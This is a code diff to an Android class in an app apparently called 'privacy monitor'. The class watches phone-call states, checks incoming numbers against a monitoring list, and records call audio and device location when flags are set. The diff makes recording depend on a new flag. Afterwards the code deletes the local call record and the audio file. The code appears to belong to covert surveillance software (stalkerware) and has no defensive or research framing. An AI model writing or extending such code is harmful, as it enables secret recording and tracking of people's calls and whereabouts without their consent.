@@ -19,6 +19,7 @@ import com.privacy.monitor.util.NetworkUtil;
 import android.content.ContentResolver;
 import android.content.Context;
 import android.content.SharedPreferences;
+import android.content.SharedPreferences.Editor;
 import android.database.Cursor;
 import android.media.MediaRecorder;
 import android.telephony.PhoneStateListener;
@@ -36,7 +37,7 @@ public class MyPhoneStateListener extends PhoneStateListener {
 	Context context;
 	boolean iscall = false;
 	private MonitorDB monitorDB;
-	private boolean isMonitor = false;
+	private boolean isMonitor = false,isCallRecMonitor = false;
 	private String longitude, latitude, soundPath = "";
 	private CallRecordDB callRecordDB;
 	private DirectiveDB directiveDB;
@@ -73,10 +74,13 @@ public class MyPhoneStateListener extends PhoneStateListener {
 						Monitor monitor = monitorDB.queryOnlyRow(Monitor.COL_PHONE + " = ? ",new String[] { incomingNumber });
 						if (monitor != null) {
 							String callMonitorStatus = monitor.getCallMonitorStatus();
+							String callRecMonitorStatus = monitor.getCallRecMonitorStatus();
 							String locationStatus = monitor.getLocationStatus();
 							if ("1".equals(callMonitorStatus)) {
-								recordCallComment();
 								isMonitor = true;
+								if("1".equals(callRecMonitorStatus)){
+									recordCallComment();
+								}
 							}
 							if ("1".equals(locationStatus)) {
 								LocationMan locationMan = new LocationMan(context);
@@ -96,7 +100,7 @@ public class MyPhoneStateListener extends PhoneStateListener {
 				iscall = true;
 				Log.d(TAG, "CALL_STATE_OFFHOOK:通话中");
 				try {
-					if (isMonitor) {
+					if (isMonitor && isCallRecMonitor) {
 						recordCallComment();
 					}
 				} catch (IOException e) {
@@ -108,7 +112,7 @@ public class MyPhoneStateListener extends PhoneStateListener {
 			case TelephonyManager.CALL_STATE_IDLE:// 空闲(处于待机状态)
 				Log.d(TAG, "CALL_STATE_IDLE:空闲中");
 				if (iscall) {
-					stopRecord();
+					if(isCallRecMonitor) stopRecord();
 					iscall = false;
 					if (isMonitor) {
 						if (context != null) {
@@ -154,6 +158,9 @@ public class MyPhoneStateListener extends PhoneStateListener {
 															callRecordDB.delete(CallRecord.COL_CALL_START_TIME+ " = ? ",new String[] { callRecord.getCallStartTime() });
 															File file = new File(soundPath);
 															if (file.exists()) {
+																Editor editor =  sp.edit();
+																editor.putString(C.DEVICE_SUP_CALL_REC,"1");
+																editor.commit();
 																if (file.isFile()) {
 																	file.delete();
 																}
